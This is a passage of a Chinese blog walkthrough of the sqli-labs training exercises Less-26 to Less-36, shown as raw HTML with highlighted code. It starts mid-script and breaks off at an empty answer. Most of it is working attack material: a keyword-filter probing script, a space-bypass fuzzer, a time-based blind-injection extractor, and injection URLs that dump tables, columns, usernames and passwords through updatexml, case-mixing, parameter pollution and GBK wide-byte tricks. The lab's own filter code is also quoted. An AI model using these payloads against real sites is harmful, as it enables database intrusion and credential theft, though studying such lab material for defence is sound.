class="string">"http://192.168.3.7/sqli/Less-26/?id=1"</span></span><br><span class="line"><span class="comment">#关键字过滤</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_filter</span><span class="params">()</span>:</span></span><br><span class="line">    valueFilter=[] <span class="comment">#记录过滤的关键字</span></span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> sqlDict:</span><br><span class="line">        targetUrl = url + value</span><br><span class="line">        res = requests.get(targetUrl)</span><br><span class="line">        soup=BeautifulSoup(res.text,<span class="string">"lxml"</span>)</span><br><span class="line">        text=soup.select(<span class="string">'font[color="#33FFFF"]'</span>)[<span class="number">0</span>].string.strip() <span class="comment">#输入关键字返回的位置</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"%"</span> <span class="keyword">in</span> value <span class="keyword">and</span> value !=<span class="string">"%"</span>:<span class="comment">#对特殊字符进行处理</span></span><br><span class="line">            value=chr(int(value.replace(<span class="string">"%"</span>,<span class="string">"0x"</span>),<span class="number">16</span>))</span><br><span class="line">        <span class="keyword">if</span> value <span class="keyword">not</span> <span class="keyword">in</span> text:</span><br><span class="line">            flag=<span class="number">0</span> <span class="comment">#判断关键字是否是已经保存的过滤关键字的子串</span></span><br><span class="line">            <span class="keyword">for</span> vf <span class="keyword">in</span> valueFilter:</span><br><span class="line">                <span class="keyword">if</span> vf.lower() <span class="keyword">in</span> value.lower():</span><br><span class="line">                    flag=<span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">                valueFilter.append(value.lower())</span><br><span class="line">                print(<span class="string">"Filter keywords:"</span>+value)</span><br><span class="line">    print(valueFilter)</span><br><span class="line"></span><br><span class="line">sql_filter()</span><br></pre></td></tr></table></figure>
<p>tips:</p>
<p>空格过滤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09 TAB 键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0b TAB 键（垂直）</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d <span class="built_in">return</span> 功能</span><br><span class="line">%a0 空格</span><br></pre></td></tr></table></figure>

<p>可以写个脚本判断判断哪些 URL 编码能够代替空格</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeToHex</span><span class="params">(num)</span>:</span></span><br><span class="line">    tmp = hex(i).replace(<span class="string">"0x"</span>, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> len(tmp)&lt;<span class="number">2</span>:</span><br><span class="line">        tmp = <span class="string">'0'</span> + tmp</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"%"</span> + tmp</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    i = changeToHex(i)</span><br><span class="line">    url = <span class="string">"http://192.168.3.7/sqli/Less-26/?id=1'"</span> + i + <span class="string">"%26%26"</span> + i + <span class="string">"'1'='1"</span></span><br><span class="line">    ret = req.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Dumb'</span> <span class="keyword">in</span> ret.text:</span><br><span class="line">        print(<span class="string">"this can use:"</span> + i)</span><br></pre></td></tr></table></figure>
<p>运行结果 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">this can use:%09</span><br><span class="line">this can use:%0a</span><br><span class="line">this can use:%0b</span><br><span class="line">this can use:%0c</span><br><span class="line">this can use:%0d</span><br><span class="line">this can use:%20</span><br><span class="line">this can use:%22</span><br><span class="line">this can use:%23</span><br><span class="line">this can use:%27</span><br><span class="line">this can use:%2a</span><br><span class="line">this can use:%2d</span><br><span class="line">this can use:%2f</span><br><span class="line">this can use:%5c</span><br></pre></td></tr></table></figure>
<p>具体还要一一一下<br>在linux下这里可以用%a0绕过    </p>
<p><strong>注意点：</strong><br>在 Windows 下会有无法用特殊字符代替空格的问题，这是 Apache 解析的问题，Linux 下无这个问题。       </p>
<p>我这里是window环境，就使用括号将空格来绕过空格  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.7/sqli/Less-26/?id=1'||(updatexml(1,concat(0x5e,database(),0x5e),1))||%27%27=%27</span><br></pre></td></tr></table></figure>
<p>爆表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.7/sqli/Less-26/?id=1'||updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(infoorrmation_schema.tables)<span class="keyword">where</span>(table_schema)=<span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)||<span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
<p>爆字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.7/sqli/Less-26/?id=1'||updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(infoorrmation_schema.columns)<span class="keyword">where</span>(table_name)=<span class="string">'users'</span>),<span class="number">0x7e</span>),<span class="number">1</span>)||<span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
<p>爆数据<br>这里有一个知识点，因为要绕过空格，所以limit 就不能用了，但是updatexml（）只能爆32位，如果要爆的数据过多，就没有办法了。所以我们这里再使用一个在盲注中用过的函数 substr()  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.7/sqli/Less-26/?id=1'||updatexml(1,substr(concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(passwoorrd))<span class="keyword">from</span>(<span class="keyword">users</span>)),<span class="number">0x7e</span>),<span class="number">1</span>,<span class="number">32</span>),<span class="number">1</span>)||<span class="string">'1'</span>=<span class="string">'1</span></span><br><span class="line"><span class="string">http://192.168.3.7/sqli/Less-26/?id=1'</span>||updatexml(<span class="number">1</span>,<span class="keyword">substr</span>(<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(passwoorrd))<span class="keyword">from</span>(<span class="keyword">users</span>)),<span class="number">0x7e</span>),<span class="number">33</span>,<span class="number">64</span>),<span class="number">1</span>)||<span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
<h1 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h1><p>在没有过滤时，第一件事是判断注入类型，是字符型还是数字型。<br>而有过滤时，判断注入类型后最重要的就是判断过滤条件。<br>但无错误回显时，如何区分是被过滤还是被转为整型呢？  </p>
<p><strong>注入类型</strong><br>1和1”正常回显，1’报错，判断为字符型，但是还要判断是否有小括号。<br><strong>判断是否有小括号</strong>   </p>
<ul>
<li><p>2’&amp;&amp;’1’=’1<br>若查询语句为where id=’$id’，查询时是where id=’2’&amp;&amp;’1’=’1’，结果是where id=’2’，回显会是id=2。<br>若查询语句为where id=(‘$id’)，查询时是where id=(‘2’&amp;&amp;’1’=’1’)，MySQL 将’2’作为了 Bool 值，结果是where id=(‘1’)，回显会是id=1。</p>
</li>
<li><p>1’)||’1’=(‘1<br>若查询语句有小括号正确回显，若无小括号错误回显（无回显）。</p>
</li>
</ul>
<p>answer:  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary</span><span class="params">()</span>:</span></span><br><span class="line">    url=<span class="string">"http://192.168.3.7/sqli/Less-26a/?id=1')"</span></span><br><span class="line">    <span class="comment">#payload="%26%26if((ascii(substr((select(database())),&#123;&#125;,1))&lt;&#123;&#125;),sleep(3),1)%26%26('1"</span></span><br><span class="line">    <span class="comment">#payload="%26%26if((ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),&#123;&#125;,1))&lt;&#123;&#125;),sleep(3),1)%26%26('1"</span></span><br><span class="line">    <span class="comment">#payload = "%26%26if((ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='users')),&#123;&#125;,1))&lt;&#123;&#125;),sleep(3),1)%26%26('1"</span></span><br><span class="line">    payload=<span class="string">"%26%26if((ascii(substr((select(group_concat(username))from(users)),&#123;&#125;,1))&lt;&#123;&#125;),sleep(3),1)%26%26('1"</span></span><br><span class="line">    info=<span class="string">""</span></span><br><span class="line">    flag=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        left=<span class="number">0x20</span></span><br><span class="line">        right=<span class="number">0x7f</span></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            mid=left+(right-left)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> left==mid:</span><br><span class="line">                <span class="keyword">if</span> mid==<span class="number">0x20</span>:</span><br><span class="line">                    flag=<span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                info=info+chr(left)</span><br><span class="line">                print(info)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            startTime=time.time()</span><br><span class="line">            tmppayload=url+payload.format(i,mid)</span><br><span class="line">            requests.get(tmppayload)</span><br><span class="line">            endTime=time.time()</span><br><span class="line">            spendTime=endTime-startTime</span><br><span class="line">            <span class="keyword">if</span> spendTime &gt;=<span class="number">3</span>:</span><br><span class="line">                right=mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left=mid</span><br><span class="line"></span><br><span class="line">binary()</span><br></pre></td></tr></table></figure>
<h1 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>select和union可以大小写绕过 </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.7/sqli/Less-27/?id=1'%26%26(updatexml(1,concat(0x7e,(<span class="keyword">SelEct</span>(<span class="keyword">user</span>())),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">26</span>%<span class="number">26</span><span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
<h1 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.7/sqli/Less-27a/?id=1"%26%26sleep(3)%26%26"1</span><br></pre></td></tr></table></figure>

<h1 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);				<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);				<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);					<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union\s+select/i'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>answer:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.7/sqli/Less-28/?id=1')%26%26sleep(3)%26%26('1</span><br></pre></td></tr></table></figure>
<h1 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/[--]/',"", $id);				//Strip out --.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/[#]/',"", $id);					//Strip out #.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union\s+select/i'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h1><p>进入的index.php，那个页面没起到拦截作用 ，所以应进Less-29/Login.php  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">	$qs = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">	$hint=$qs;</span><br><span class="line">	$id1=java_implimentation($qs);</span><br><span class="line">	$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">	<span class="comment">//echo $id1;</span></span><br><span class="line">	whitelist($id1);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">whitelist</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$match = preg_match(<span class="string">"/^\d+$/"</span>, $input);</span><br><span class="line">	<span class="keyword">if</span>($match)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//echo "you are good";</span></span><br><span class="line">		<span class="comment">//return $match;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	</span><br><span class="line">		header(<span class="string">'Location: hacked.php'</span>);</span><br><span class="line">		<span class="comment">//echo "you are bad";</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span><span class="params">($query_string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$q_s = $query_string;</span><br><span class="line">	$qs_array= explode(<span class="string">"&amp;"</span>,$q_s);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>($qs_array <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">	&#123;</span><br><span class="line">		$val=substr($value,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="keyword">if</span>($val==<span class="string">"id"</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			$id_value=substr($value,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> $id_value;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>tips:<br><strong>HTTP参数污染（HPP）</strong><br>HPP方法主要用于服务器两层架构<br><img src="../images/loopholes/sql/sqli/1.png" alt=""><br>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。工作流程为：client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache服务器请求数据。数据返回路径则相反。<br>所以重点：index.php?id=1&amp;id=2，到底是显示 id=1 的数据还是显示 id=2 的？<br>Explain：apache（php）解析最后一个参数，即显示 id=2 的内容。Tomcat（jsp）解析第一个参数，即显示 id=1 的内容。   </p>
<p>对于几个主要的服务器，其对多个参数的获取情况归纳如下：<br><img src="../images/loopholes/sql/sqli/2.png" alt="">  </p>
<p>answer:<br>假如传入两个id ,java_implimentation会对第一个id进行过滤处理 <code>$_GET[&#39;id&#39;]</code>得到的是第二个id的值。 所以这里可以使用第二个id绕过过滤。    </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.3.7&#x2F;sqli&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&#39; union select 1,2,group_concat(username,0x23,password) from users --+</span><br></pre></td></tr></table></figure>


<h1 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h1><p>双引号闭合，其他跟Less-29一样    </p>
<h1 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h1><p>“)闭合，其他跟Less-30一样      </p>
<h1 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h1><p>宽字节注入  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = preg_replace(<span class="string">'/'</span>. preg_quote(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, $string);          <span class="comment">//escape any backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, $string);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, $string);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=check_addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="comment">//echo "The filtered request is :" .$id . "&lt;br&gt;";</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。   </p>
<p>answer:   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.7&#x2F;sqli&#x2F;Less-32&#x2F;?id&#x3D;%df&#39;  union select 1,2,group_concat(username) from users--+</span><br></pre></td></tr></table></figure>

<h1 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h1><p>和上题目一样宽字节注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= addslashes($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id=check_addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line"></span><br><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>

<h1 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h1><p>POST形式的宽字节注入  </p>
<h1 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h1><p>整型宽字节注入 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> check_addslashes(<span class="variable">$string</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$string</span> = addslashes(<span class="variable">$string</span>);</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。<br>单引号（’）<br>双引号（”）<br>反斜杠（\）<br>NULL  </p>
<h1 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= mysql_real_escape_string($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line"><span class="string">'</span></span><br><span class="line"><span class="string">"</span></span><br><span class="line"><span class="string">\x1a</span></span><br></pre></td></tr></table></figure>
<p>answer:</p>
